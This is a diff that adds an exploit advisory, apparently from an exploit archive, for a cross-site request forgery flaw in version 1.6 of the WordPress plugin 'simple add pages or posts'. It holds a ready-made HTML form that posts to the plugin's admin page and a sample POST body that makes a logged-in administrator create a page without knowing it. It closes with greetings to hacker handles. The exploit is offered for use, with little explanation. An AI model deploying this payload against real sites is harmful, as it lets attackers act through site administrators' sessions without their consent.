@@ -1,0 +1,42 @@
+########################################################################
+# Exploit Title: Wordpress simple add pages or posts CSRF Vulnerability
+# Date: 2016/29/01
+# Exploit Author: ALIREZA_PROMIS
+# Vendor Homepage: https://wordpress.org/plugins/simple-add-pages-or-posts/
+# Software Link: https://downloads.wordpress.org/plugin/simple-add-pages-or-posts.1.6.zip
+# Version: 1.6
+# Tested on: ubuntu / FireFox
+########################################################################
+
+[Exploitation]
+https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
+
+[HTML CODE ]
+<form id="form1" name="form1" method="post" action="http://site.com/wp-admin/plugins.php?page=simple-add-pages-or-posts%2Fsimple_add_pages_or_posts.php"
+<select name="postorpage">
+<option value="page">Page</option>
+<option value="post">Post</option>
+</select>
+<td colspan="2"><select name='post_parent' id='post_parent'>
+<option value="">No, do not use parent</option>
+<option class="level-0" value="2">Sample Page</option>
+</select>
+<tr class="alternate iedit">
+<textarea name="titles" rows="1" cols="30">&lt;/textarea&gt;
+<tr class="iedit">
+<td colspan="2"><select name="author_id">
+<option value="1">admin</option></select>
+<input type="submit" name="submitbutton" value="Add" class="button-primary"></form>
+
+
+
+and live POST request :
+postorpage=page&post_parent=2&titles=TEST_CSRF&author_id=1&submitbutton=Add
+
+
+########################################################################
+# Friends : ali ahmady , Mr.Moein , sheytan azzam , Mr.PERSIA , H3llBoy.Blackhat , Amir , Jok3r
+# Sajjad Sotoudeh , security  , Kamran Helish , Dr.RooT , Milad Inj3ctor , Mr.Turk
+#
+# [+] fb.com/alirezapomis.blackhat
+########################################################################
